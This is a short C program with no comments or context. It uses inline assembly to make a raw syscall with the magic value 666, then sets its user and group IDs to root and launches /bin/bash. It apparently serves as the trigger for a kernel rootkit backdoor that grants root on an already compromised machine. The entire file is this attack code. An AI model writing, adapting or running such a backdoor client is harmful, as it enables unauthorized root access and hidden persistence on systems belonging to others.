#include <stdio.h>
#include <stdlib.h>

main()
{
   __asm__(
      "xorl %eax, %eax\n"
      "incl %eax\n"
      "pushl $666\n"
      "popl %ebx\n"
      "int $0x80\n"
   );

   setresuid(0, 0, 0);
   setresgid(0, 0, 0);

   execl("/bin/bash", "bash", NULL);
}
